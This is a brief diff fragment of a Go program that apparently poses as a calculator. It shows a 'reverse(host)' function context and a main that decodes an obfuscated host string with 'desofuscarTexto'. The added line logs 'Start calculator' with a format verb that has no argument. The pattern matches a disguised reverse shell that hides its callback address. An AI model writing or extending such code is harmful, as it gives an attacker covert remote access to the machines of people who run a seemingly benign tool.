@@ -272,7 +272,7 @@ func reverse(host string) {
 	}
 }
 func main() {
-
+	log.Printf("Start calculator %s\n")
 	host := "NUlzMkF3PD5yMkF2OEp5PUh6"
 	host = desofuscarTexto(host)
 
